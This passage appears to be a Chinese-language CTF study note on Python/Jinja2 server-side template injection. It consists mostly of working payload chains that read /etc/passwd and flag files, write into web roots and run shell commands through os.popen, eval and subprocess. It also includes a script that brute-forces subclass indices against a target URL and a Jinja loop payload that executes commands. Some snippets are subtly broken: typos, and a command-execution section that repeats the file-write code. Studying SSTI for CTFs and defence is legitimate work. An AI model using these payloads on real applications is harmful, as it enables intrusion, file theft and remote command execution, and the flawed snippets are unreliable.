<figure><img src="../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

比如我们在附加文件other.py里面写入让他打印hello，world的语句

```python
print('hello world')
```

我们在tt.py里面直接写

```python
import_part = __import__('other')
```

然后运行tt.py文件

<figure><img src="../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

可以发现他直接成功了。



#### Ⅵ.\_\_dict\_\_



> 类的静态函数，类函数，普通函数，全局变量以及一些内置的属性都在类\_\_dict\_\_里面

```python
class A (object):
    def hello(self):
        print('hello')

print(A.__dict__)
```

<figure><img src="../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

最后的输出结果为

```python
{'__module__': '__main__', 'hello': <function A.hello at 0x0000027F5CFEA4D0>, '__dict__': <attribute '__dict__' of 'A' objects>, '__weakref__': <attribute '__weakref__' of 'A' objects>, '__doc__': None}

```



#### Ⅶ.\_\_init\_\_



> 类的初始化方法，在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的。

```python
class A (object):
    def hello(self):
        print('hello')

print(A.__init__)
```

<figure><img src="../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>



#### Ⅷ.\_\_glovals\_\_



> 函数以字典类型返回当前位置的全部变量与func\_\_globals等价



#### Ⅸ.\_\_builtins\_\_



> 查看其引用，（其中包含了大量的内置函数，python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了，而对于builtins却不用导入，他在任何模块都直接可看



### ②常见函数方法

#### Ⅰ获取基本类

```python
''.__class__.__mro__[1]
{}.__class__.__base__[0]
().__class__.__base__[0]
[].__class__.__base__[0]
object
```



#### Ⅱ.读文件

```python
().__class__.__base__[0].__subclasses__()[40](r'C:\1.php').read()
object.__subclasses__()[40](r'C:\1.php').read()
```



```python
[].__class__.__base__[0].__subclasses__()[NUM]["get_data"](0,"/etc/passwd")
```



```python
- codecs模块
x[NUM].__init__.__globals__['__builtins__'].eval("__import__('codecs').open('/app/flag').read()") 

- pathlib模块
x[NUM].__init__.__globals__['__builtins__'].eval("__import__('pathlib').Path('/app/flag').read_text()") 

- io模块
x[NUM].__init__.__globals__['__builtins__'].eval("__import__('io').open('/app/flag').read()")

- open函数
x[NUM].__init__.__globals__['__builtins__'].eval("open('/app/flag').read()")
```





#### Ⅲ写文件

```python
().__class__.__base__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')

```



#### Ⅳ.执行任意命令

```python
().__class__.__base__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')

```



```python
# eval 
x[NUM].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()') 

# os.py
x[NUM].__init__.__globals__['os'].popen('ls /').read()

# popen
x[NUM].__init__.__globals__['popen']('ls /').read()

# _frozen_importlib.BuiltinImporter
x[NUM]["load_module"]("os")["popen"]("ls /").read()

# linecache
x[NUM].__init__.__globals__['linecache']['os'].popen('ls /').read()

# subprocess.Popen
x[NUM]('ls /',shell=True,stdout=-1).communicate()[0].strip()
```





#### Ⅴ.替换模板

<figure><img src="../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>





### ③利用方法

现在对于上述指令可能有点懵逼。

我们可以把SSTI做的事情抽象成下面的代码

```python
class O: pass # O 是基类，A、B、F、G 都直接或间接继承于它
# 继承关系 A -> B -> O
class B(O): pass
class A(B): pass

# F 类继承自 O，拥有读取文件的方法
class F(O): def read_file(self, file_name): pass

# G 类继承自 O，拥有执行系统命令的方法
class G(O): def exec(self, command): pass
```

假如我们现在拿到了A，想读取目录下的文件，那么我们就需要去找F和G。那问题就变成了怎么找F和G。

**找对象A的类 - 类A** -> **找类A的父亲 - 类B** -> **找祖先/基类 - 类O** -> **便利祖先下面所有的子类** -> **找到可利用的类 类F 类G**-> **构造利用方法**-> **读写文件/执行命令**

然后我们可以看到一些基本步骤就是

```python
>>>print(A.__class__) # 使用 __class__ 查看类属性
<class '__main__.A'>
>>> print(A.__class__.__base__) # 使用 __base__ 查看父类
<class '__main__.B'>
>>> print(A.__class__.__base__.__base__)# 查看父类的父类 (如果继承链足够长，就需要多个base)
<class '__main__.O'>
>>>print(A.__class__.__mro__) # 直接使用 __mro__ 查看类继承关系顺序
(<class '__main__.A'>, <class '__main__.B'>, <class '__main__.O'>, <class 'object'>)
>>>print(A.__class__.__base__.__base__.__subclasses__()) # 查看祖先下面所有的子类（这里假定祖先为O）
[<class '__main__.B'>, <class '__main__.F'>, <class '__main__.G'>]
```

这里有两个构建payload的脚本，实在是优秀，放在这里

### Ⅰ.找序号的脚本

```
# 使用 python 脚本 用于寻找序号
url = "http://url/level/1"
def find_eval(url):
    for i in range(500):
        data = {
            'code': "{{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}",
        }
        res = requests.post(url, data=data, headers=headers)
        if 'eval' in res.text:
            print(data)
find_eval(url)
```



### Ⅱ.直接生成payload脚本

```python
 # 模板语法 _ 命令执行_eval
{% raw %}
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'eval' in x.__init__.__globals__['__builtins__']['eval'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()') }}
    {% endif %}
{% endfor %}
{% endraw %}
```



### ④常见可利用类

#### Ⅰ.文件读取

**方法一：子模块利用**

(1)存在的子模块可以通过.index()来查询，如果存在的话返回索引

```python
''.__class__.__mro__[2].__subclasses__().index(file)
```

(2)file类:(在字符串的所属对象中获得str的父类，在其object父类中查找所有子类，第41个为file类）

```python
''.__class__.__mro__[2].__subclasses__()[40]('<File_To_Read>').read()
```

(3)\_\_frozen\_importlib\_external.FileLoader类：（前置查询一样，其是第91个类）

```python
''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"<File_To_Read>")
```



**方法二：通过函数解析->基本类->基本类子类->重载类->引用->查找可用函数**

```python
''.__class__.__mro__[2].__subcalsses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read() 
```

把read改成write就可写了。



#### Ⅱ.命令执行

**方法一：利用eval进行命令执行**

```python
''.__class__.__mro__[2]__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
```



**方法二：利用warnings.catch\_warnings进行命令执行**

查看warnings.catch\_warnings方法的位置

```python
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
```

查看linecatch的位置

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
```

查找os模块的位置

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
```

查找system方法的位置（在这里使用os.open().read()一样可以实现一样的效果，步骤一样，不再复述）

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
```

调用systen方法

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
```



**方法三：利用commands进行命令执行**

```python
{}.__class__.__base__[0].__subclasses__()[59].__init__.globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
```

```python
{}.__class__.__base__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
```

```python
{}.__class__.__base__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```













***

就算知识点总结过了，还是觉得不是很懂，我们寻找网课。

[https://www.youtube.com/watch?v=QLqHMMcBXuQ\&list=PL1GDzLoRwyVCEG\_dnWcQDbDXJSBw7lTOT](https://www.youtube.com/watch?v=QLqHMMcBXuQ\&list=PL1GDzLoRwyVCEG\_dnWcQDbDXJSBw7lTOT)





































## 参考门：



{% embed url="https://www.jianshu.com/p/b6f1aea3a2eb" %}

{% embed url="https://cs-cshi.github.io/cybersecurity/flask%E4%B9%8Bssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E5%85%A5%E9%97%A8/" %}

{% embed url="https://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" %}

{% embed url="https://tr0jan.top/archives/43/" %}

{% embed url="https://hello-ctf.com/HC_Web/ssti/" %}

{% embed url="https://exp10it.io/2022/08/python-ssti-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/" %}











